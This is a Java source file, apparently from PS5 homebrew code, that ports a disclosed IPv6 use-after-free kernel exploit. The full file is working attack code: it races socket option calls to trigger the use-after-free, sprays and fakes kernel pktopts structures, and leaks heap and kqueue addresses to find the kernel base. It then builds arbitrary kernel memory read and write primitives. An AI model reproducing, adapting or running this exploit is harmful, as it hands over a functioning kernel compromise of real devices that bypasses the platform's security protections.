// PS5 Java port of the ipv6 use after free exploit disclosed by theflow at:
// https://hackerone.com/reports/826026
package org.homebrew;

import java.io.IOException;
import java.io.PrintStream;
import java.util.ArrayList;
import java.util.HashSet;

public class KernelMemory {
    // BSD macros
    private static final int AF_INET6 = 28;
    private static final int SOCK_DGRAM = 2;
    private static final int IPPROTO_UDP = 17;
    private static final int IPPROTO_IPV6 = 41;
    private static final int IPV6_TCLASS = 61;
    private static final int IPV6_RTHDR_TYPE_0 = 0;
    private static final int IPV6_RTHDR = 51;
    private static final int IPV6_PKTINFO = 46;
    private static final int IPV6_2292PKTOPTIONS = 25;
    private static final int RTP_SET = 1;
    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;
    private static final short RTP_PRIO_REALTIME = 2;

    // Auxillary macros
    private static final int TCLASS_MASTER = 0x13370000;
    private static final int TCLASS_TAINT = 0x42;
    private static final int TCLASS_SPRAY = 0x41;

    private static final int NUM_SPRAY = 0x69;
    private static final int NUM_SPRAY_RACE = NUM_SPRAY-1;
    private static final int NUM_KQUEUES = 0x96;

    private static final int IN6_PKTINFO_SIZE = 20;

    private static final int PKTOPTS_PKTINFO_OFFSET = 16;
    private static final int PKTOPTS_RTHDR_OFFSET = 112;
    private static final int PKTOPTS_TCLASS_OFFSET = 192;

    // State variables
    private static int[] spray_sock = new int[NUM_SPRAY];
    private static long pktopts_addr = 0;
    private static long kqueue_addr = 0;
    private static long pipe_addr = 0;
    private static long kernel_base = 0;
    private static int master_sock = -1;
    private static int overlap_sock = -1;
    private static int victim_sock = -1;
    private static int pipe_read = -1;
    private static int pipe_write = -1;

    private static void println(String s) {
	LoggingUI.getInstance().log(s);
	//libkernel.usleep(1000*1000);
    }

    private static void perror(String s) {
	println(s + ": " + libcInternal.strerror());
    }
    
    private static int new_socket() {
	int ret = libkernel.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
	if(ret < 0) {
	    perror("socket");
	}
	return ret;
    }

    private static void build_tclass_cmsg(long buf, int val) {
	NativeMemory.putInt(buf + 0x00, 20);
	NativeMemory.putInt(buf + 0x04, IPPROTO_IPV6);
	NativeMemory.putInt(buf + 0x08, IPV6_TCLASS);
	NativeMemory.putInt(buf + 0x10, val);
    }

    private static int build_rthdr_msg(long buf, int size) {
	int len;

	len = ((size >> 3) - 1) & ~1;
	size = (len + 1) << 3;

	NativeMemory.setMemory(buf, size, (byte)0);
	NativeMemory.putByte(buf + 0, (byte)0);
	NativeMemory.putByte(buf + 1, (byte)len);
	NativeMemory.putByte(buf + 2, (byte)IPV6_RTHDR_TYPE_0);
	NativeMemory.putByte(buf + 3, (byte)(len >> 1));

	return size;
    }

    private static int get_rthdr(int s, long buf, int len) {
	long addr = NativeMemory.allocateMemory(4);
	try {
	    NativeMemory.putInt(addr, len);
	    int ret = libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, addr);
	    if(ret < 0) {
		perror("getsockopt");
	    }
	    return ret;
	} finally {
	    NativeMemory.freeMemory(addr);
	}
    }

    private static int set_rthdr(int s, long buf, int len) {
	int ret = libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
	if(ret < 0) {
	    perror("setsockopt");
	}
	return ret;
    }

    private static int free_rthdr(int s) {
	return set_rthdr(s, 0, 0);
    }

    private static int get_tclass(int s) {
	int val;

	long p_val = NativeMemory.allocateMemory(4);
	long p_len = NativeMemory.allocateMemory(4);

	try {
	    NativeMemory.putInt(p_len, 4);
	    NativeMemory.putInt(p_val, 0);
	    if(libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, p_len) == 0) {
		return NativeMemory.getInt(p_val);
	    } else {
		perror("getsockopt");
		return 0;
	    }
	} finally {
	    NativeMemory.freeMemory(p_val);
	    NativeMemory.freeMemory(p_len);
	}
    }

    private static void set_tclass(int s, int val) {
	long p_val = NativeMemory.allocateMemory(4);
	try {
	    NativeMemory.putInt(p_val, val);
	    if(libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, p_val, 4) != 0) {
		perror("setsockopt");
	    }
	} finally {
	    NativeMemory.freeMemory(p_val);
	}
    }

    private static void get_pktinfo(int s, long buf) {
	long p_len = NativeMemory.allocateMemory(4);
	try {
	    NativeMemory.putInt(p_len, IN6_PKTINFO_SIZE);
	    if(libkernel.getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, p_len) != 0) {
		perror("getsockopt");
	    }
	} finally {
	    NativeMemory.freeMemory(p_len);
	}
    }

    private static void set_pktinfo(int s, long buf) {
	if(libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, IN6_PKTINFO_SIZE) != 0) {
	    perror("setsockopt");
	}
    }

    private static void set_pktopts(int s, long buf, int len) {
	if(libkernel.setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len) != 0) {
	    perror("setsockopt");
	}
    }

    private static void free_pktopts(int s) {
	set_pktopts(s, 0, 0);
    }

    private static long leak_rthdr_ptr(int s) {
	long buf = NativeMemory.allocateMemory(0x100);
	try {
	    NativeMemory.setMemory(buf, 0x100, (byte)0);
	    get_rthdr(s, buf, 0x100);
	    return NativeMemory.getLong(buf + PKTOPTS_RTHDR_OFFSET);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }
    
    private static long leak_kmalloc(long buf, int size) {
	int rthdr_len = build_rthdr_msg(buf, size);
	set_rthdr(master_sock, buf, rthdr_len);
	return leak_rthdr_ptr(overlap_sock);
    }

    private static void write_to_victim(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	try {
	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	    NativeMemory.putLong(buf + 0x00, addr);
	    NativeMemory.putLong(buf + 0x08, 0);
	    NativeMemory.putInt(buf + 0x10, 0);
	    set_pktinfo(master_sock, buf);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }

    private static int find_victim_sock() {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	try {
	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	    write_to_victim(pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
	    for(int i=0; i<NUM_SPRAY; i++) {
		get_pktinfo(spray_sock[i], buf);
		if(NativeMemory.getLong(buf + 0x00) != 0) {
		    return i;
		}
	    }
	    return -1;
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }

    private static byte kread8(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	try {
	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	    write_to_victim(addr);
	    get_pktinfo(victim_sock, buf);
	    return NativeMemory.getByte(buf);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }
    
    private static short kread16(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	try {
	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	    write_to_victim(addr);
	    get_pktinfo(victim_sock, buf);
	    return NativeMemory.getShort(buf);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }

    private static int kread32(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	try {
	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	    write_to_victim(addr);
	    get_pktinfo(victim_sock, buf);
	    return NativeMemory.getInt(buf);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }

    private static long kread64(long addr) {
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	try {
	    NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	    write_to_victim(addr);
	    get_pktinfo(victim_sock, buf);
	    return NativeMemory.getLong(buf);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }

    private static int find_overlap_sock() {
	for(int i=0; i<NUM_SPRAY; i++) {
	    set_tclass(spray_sock[i], TCLASS_SPRAY);
	}
		
	set_tclass(master_sock, TCLASS_TAINT);
	
	for(int i=0; i<NUM_SPRAY; i++) {
	    if(get_tclass(spray_sock[i]) == TCLASS_TAINT) {
		return i;
	    }
	}
	
	return -1;
    }

    private static int spray_pktopts() {
	for(int i=0; i<NUM_SPRAY_RACE; i++) {
	    set_tclass(spray_sock[i], TCLASS_SPRAY);
	}
	
	if(get_tclass(master_sock) == TCLASS_SPRAY) {
	    return 1;
	}
	
	for(int i=0; i < NUM_SPRAY_RACE; i++) {
	    free_pktopts(spray_sock[i]);
	}
	
	return 0;
    }

    private static int trigger_uaf() {
	long triggered = NativeMemory.allocateMemory(1);
	long mask = NativeMemory.allocateMemory(CPU_SETSIZE);
	long prio = NativeMemory.allocateMemory(0x4);
	
	NativeMemory.setMemory(mask, CPU_SETSIZE, (byte)0);
	NativeMemory.setMemory(prio, 0x4, (byte)0);
	NativeMemory.putByte(triggered, (byte)0);
	NativeMemory.putByte(mask + 1, (byte)1);
	NativeMemory.putShort(prio, RTP_PRIO_REALTIME);
	NativeMemory.putShort(prio + 2, (short)0x100);
	
	libkernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
				     -1, CPU_SETSIZE, mask);
	libkernel.rtprio_thread(RTP_SET, 0, prio);

	Thread thread = new Thread(){
		public void run() {
		    long buf = NativeMemory.allocateMemory(24);
		    NativeMemory.setMemory(buf, 24, (byte)0);
		    
		    NativeMemory.putByte(mask + 1, (byte)2);
		    libkernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
						 -1, CPU_SETSIZE, mask);
		    libkernel.rtprio_thread(RTP_SET, 0, prio);
		    build_tclass_cmsg(buf, 0);

		    while(NativeMemory.getByte(triggered) == 0 &&
			  get_tclass(master_sock) != TCLASS_SPRAY) {
			set_pktopts(master_sock, buf, 24);
		    }
		    NativeMemory.freeMemory(buf);
		    NativeMemory.putByte(triggered, (byte)0xff);
		}
	    };

	thread.start();
	
	while(NativeMemory.getByte(triggered) == 0 &&
	      get_tclass(master_sock) != TCLASS_SPRAY) {
	    free_pktopts(master_sock);
	    if(spray_pktopts() == 1) {
		break;
	    }
	}
	NativeMemory.putByte(triggered, (byte)0xff);
	
	try {
	    thread.join();
	} catch (Throwable t) {
	}
	
	NativeMemory.freeMemory(triggered);
	NativeMemory.freeMemory(mask);
	NativeMemory.freeMemory(prio);
	
	return find_overlap_sock();
    }

    private static int fake_pktopts(int target_fd, long pktinfo, int tag) throws IOException {
	long buf = NativeMemory.allocateMemory(0x100);
	int rthdr_len, tclass;

	// Free master_sock's pktopts
	free_pktopts(target_fd);

	// Spray rthdr's to refill target_fd's pktopts
	NativeMemory.setMemory(buf, 0x100, (byte)0);
	rthdr_len = build_rthdr_msg(buf, 0x100);
	for(int i=0; i<NUM_SPRAY; i++) {
	    NativeMemory.putLong(buf + PKTOPTS_PKTINFO_OFFSET, pktinfo);
	    NativeMemory.putInt(buf + PKTOPTS_TCLASS_OFFSET, tag | i);
	    set_rthdr(spray_sock[i], buf, rthdr_len);
	}

	tclass = get_tclass(master_sock);

	// See if pktopts has been refilled correctly
	if((tclass & 0xffff0000) != tag) {
	    throw new IOException("Cannot refill pktopts");
	}

	NativeMemory.freeMemory(buf);

	return tclass & 0xffff;
    }

    private static void leak_pktopts() {
	long buf = NativeMemory.allocateMemory(0x100);
	
	// Free pktopts
	for(int i=0; i<NUM_SPRAY; i++) {
	    free_pktopts(spray_sock[i]);
	}

	// Leak 0x100 kmalloc addr
	pktopts_addr = leak_kmalloc(buf, 0x100);

	// Free rthdr buffer and spray pktopts to occupy this location
	free_rthdr(master_sock);
	for (int i=0; i<NUM_SPRAY; i++) {
	    set_tclass(spray_sock[i], 0);
	}

	NativeMemory.freeMemory(buf);
    }

    private static void leak_kqueue() {
	long buf = NativeMemory.allocateMemory(0x120);
	int rthdr_len = build_rthdr_msg(buf, 0x120);
	int[] fds = new int[0x5C];

	// Spray kqueues
	for(int i=0; i<fds.length; i++) {
	    if((fds[i]=libkernel.kqueue()) < 0) {
		perror("kqueue");
		continue;
	    }
	}

	// Create holes
	for(int i=0; i<fds.length; i+=2) {
	    if(libkernel.close(fds[i]) < 0) {
		perror("close");
	    }
	}

	set_rthdr(master_sock, buf, rthdr_len);
	long addr = leak_rthdr_ptr(overlap_sock);

	for(int i=0; i<0x1000; i+=8) {
	    long q = kread64(addr + i);
	    if(!(q >= -0x1000000000000l && q < -1 && (q & 0xff) != 0)) {
		continue;
	    }

	    // "kqueue\x00"
	    if((kread64(q) & 0xffffffffffffffl) == 0x65756575716bl) {
		kqueue_addr = q;
		break;
	    }
	}

	// cleanup
	for(int i=1; i<fds.length; i+=2) {
	    if(libkernel.close(fds[i]) < 0) {
		perror("close");
	    }
	}

	NativeMemory.freeMemory(buf);
    }

    private static long get_file_addr(int fd) throws IOException {
	long proc_fd_addr = kread64(getProcAddress() + KernelOffset.PROC_FD);
	long ofiles_addr = kread64(proc_fd_addr) + 8;
	long filedescent_addr = kread64(ofiles_addr + (0x30 * fd));
	return kread64(filedescent_addr); // fde_file
    }
    
    private static void inc_socket_refcount(int fd) throws IOException {
	long file_addr = get_file_addr(fd);
	if(file_addr == 0) {
	    return;
	}
	long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);
	NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
	NativeMemory.putInt(buf, 0x100);
	NativeMemory.putInt(buf + 4, 2);

	write_to_victim(file_addr);
	set_pktinfo(victim_sock, buf);
	
	NativeMemory.freeMemory(buf);
    }
    
    private static void cleanup() throws IOException  {
	inc_socket_refcount(overlap_sock);
	inc_socket_refcount(master_sock);
	inc_socket_refcount(victim_sock);
	
	for(int fd : spray_sock) {
	    if(libkernel.close(fd) < 0) {
		perror("close");
	    }
	}
    }

    private static void setup_rw_pipe() throws IOException {
	long buf = NativeMemory.allocateMemory(8);
	if(libkernel.pipe(buf) == 0) {
	    pipe_read = NativeMemory.getInt(buf);
	    pipe_write = NativeMemory.getInt(buf + 4);
	    pipe_addr = get_file_addr(pipe_read);
	} else {
	    perror("pipe");
	}
	NativeMemory.freeMemory(buf);
    }
    
    public static void enableRW() throws IOException {
	long knote, kn_fop, f_detach;
	int idx;

	master_sock = new_socket();
	for(int i=0; i<spray_sock.length; i++) {
	    spray_sock[i] = new_socket();
	}

	println("  [*] Triggering IPv6 UAF...");
	idx = trigger_uaf();
	if(idx == -1) {
	    throw new IOException("Cannot find overlapping socket");
	}

	// master_sock and overlap_sock point to the same pktopts
	overlap_sock = spray_sock[idx];
	spray_sock[idx] = new_socket();
	println("  [+] Overlap socket: " + overlap_sock + " ("  + idx + ")");

	// Reallocate pktopts
	for(int i=0; i<NUM_SPRAY; i++) {
	    free_pktopts(spray_sock[i]);
	    set_tclass(spray_sock[i], 0);
	}

	// Fake master pktopts
	idx = fake_pktopts(overlap_sock, 0, TCLASS_MASTER);
	overlap_sock = spray_sock[idx];
	spray_sock[idx] = new_socket(); // use new socket so logic in spraying will be easier
	println("  [+] Overlap socket: " + overlap_sock + " ("  + idx + ")");

	// Leak address of some pktopts
	leak_pktopts();
	println("  [+] pktopts_addr: 0x" + Long.toHexString(pktopts_addr));

	// Fake master pktopts
	idx = fake_pktopts(overlap_sock, pktopts_addr + PKTOPTS_PKTINFO_OFFSET, TCLASS_MASTER);
	overlap_sock = spray_sock[idx];
	println("  [+] Overlap socket: " + overlap_sock + " ("  + idx + ")");

	idx = find_victim_sock();
	if (idx == -1) {
	    throw new IOException("Cannot find victim socket");
	}

	victim_sock = spray_sock[idx];
	spray_sock[idx] = new_socket();

	println("  [*] Leaking kqueue_addr...");
	leak_kqueue();
	println("  [+] kqueue_addr: 0x" + Long.toHexString(kqueue_addr));
	
	kernel_base = (kqueue_addr & ~0xFFFF) - 0x310000;
	println("  [*] Cleaning up...");
	cleanup();

	println("  [*] Setting up kernel .data read/write pipe...");
	setup_rw_pipe();
	if(pipe_addr == 0) {
	    throw new IOException("Cannot setup R/W pipe");
	}
    }

    public static long getBaseAddress() throws IOException {
	if(kernel_base == 0) {
	    throw new IOException("Invalid base address");
	}
	
	return kernel_base;
    }

    public static long getProcAddress(int pid) throws IOException {
	synchronized(KernelMemory.class) {
	    long proc = kread64(getBaseAddress() + KernelOffset.ALLPROC);
	    while (proc != 0) {
		if (kread32(proc + KernelOffset.PROC_PID) == pid) {
		    return proc;
		}
		proc = kread64(proc);
	    }
	}
	
	throw new IOException("Unknown process id");
    }

    public static long getProcAddress() throws IOException {
	return getProcAddress(libkernel.getpid());
    }

    public static long getPipeAddress() throws IOException {
	if(pipe_addr == 0) {
	    throw new IOException("Invalid pipe address");
	}
	return pipe_addr;
    }

    public static int getPipeRead() {
	return pipe_read;
    }

    public static int getPipeWrite() {
	return pipe_write;
    }
    
    public static int getMasterSocket() {
	return master_sock;
    }

    public static int getVictimSocket() {
	return victim_sock;
    }

    public static byte getByte(long addr) throws IOException {
	if(kernel_base == 0) {
	    throw new IOException("Invalid base address");
	}
	synchronized(KernelMemory.class) {
	    return kread8(addr);
	}
    }

    public static short getShort(long addr) throws IOException  {
	if(kernel_base == 0) {
	    throw new IOException("Invalid base address");
	}
	synchronized(KernelMemory.class) {
	    return kread16(addr);
	}
    }

    public static int getInt(long addr) throws IOException  {
	if(kernel_base == 0) {
	    throw new IOException("Invalid base address");
	}
	synchronized(KernelMemory.class) {
	    return kread32(addr);
	}
    }

    public static long getLong(long addr) throws IOException  {
	if(kernel_base == 0) {
	    throw new IOException("Invalid base address");
	}
	synchronized(KernelMemory.class) {
	    return kread64(addr);
	}
    }

    public static byte[] getBytes(long addr, int length) throws IOException {
	byte bytes[] = new byte[length];
	for(int i=0; i<length; i++) {
	    bytes[i] = getByte(addr + i);
	}
	return bytes;
    }

    public static void putBytes(long addr, byte[] bytes) throws IOException {
	for(int i=0; i<bytes.length; i++) {
	    putByte(addr+i, bytes[i]);
	}
    }

    public static void putString(long addr, String str) throws IOException {
	for(int i=0; i<str.length(); i++) {
	    putByte(addr+i, (byte)str.charAt(i));
	}
    }

    public static String getString(long addr, int length) throws IOException {
	byte bytes[] = getBytes(addr, length);
	return new String(bytes);
    }

    public static String getString(long addr) throws IOException {
	StringBuffer sb = new StringBuffer();

	while(true) {
	    byte b = getByte(addr);
	    if(b != 0) {
		sb.append((char)b);
	    } else {
		break;
	    }
	    addr += 1;
	}

	return sb.toString();
    }
    
    public static long copyout(long dst_addr, long src_addr, int length) throws IOException {
	if(pipe_addr == 0) {
	    throw new IOException("Invalid pipe");
	}

	synchronized(KernelMemory.class) {
	    long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);

	    try {
		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
		NativeMemory.putLong(buf, 0x4000000040000000l);
		NativeMemory.putLong(buf + 8, 0x4000000000000000l);

		write_to_victim(pipe_addr);
		set_pktinfo(victim_sock, buf);

		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
		NativeMemory.putLong(buf, src_addr);
	    
		write_to_victim(pipe_addr + 16);
		set_pktinfo(victim_sock, buf);

		return libkernel.read(pipe_read, dst_addr, length);
	    } finally {
		NativeMemory.freeMemory(buf);
	    }
	}
    }

    public static long copyin(long dst_addr, long src_addr, int length) throws IOException {
	if(pipe_addr == 0) {
	    throw new IOException("Invalid pipe");
	}

	synchronized(KernelMemory.class) {
	    long buf = NativeMemory.allocateMemory(IN6_PKTINFO_SIZE);

	    try {
		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
		NativeMemory.putLong(buf + 8, 0x4000000000000000l);
	
		write_to_victim(pipe_addr);
		set_pktinfo(victim_sock, buf);

		NativeMemory.setMemory(buf, IN6_PKTINFO_SIZE, (byte)0);
		NativeMemory.putLong(buf, dst_addr);

		write_to_victim(pipe_addr + 0x10);
		set_pktinfo(victim_sock, buf);
		
		return libkernel.write(pipe_write, src_addr, length);
	    } finally {
		NativeMemory.freeMemory(buf);
	    }
	}
    }

    public static void putByte(long addr, byte value) throws IOException {
	long buf = NativeMemory.allocateMemory(1);
	NativeMemory.putByte(buf, value);
	
	try {
	    copyin(addr, buf, 1);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }

    public static void putShort(long addr, short value) throws IOException {
	long buf = NativeMemory.allocateMemory(2);
	NativeMemory.putShort(buf, value);
	
	try {
	    copyin(addr, buf, 2);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }
    
    public static void putInt(long addr, int value) throws IOException {
	long buf = NativeMemory.allocateMemory(4);
	NativeMemory.putInt(buf, value);
	
	try {
	    copyin(addr, buf, 4);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }
    
    public static void putLong(long addr, long value) throws IOException {
	long buf = NativeMemory.allocateMemory(8);
	NativeMemory.putLong(buf, value);
	
	try {
	    copyin(addr, buf, 8);
	} finally {
	    NativeMemory.freeMemory(buf);
	}
    }
}
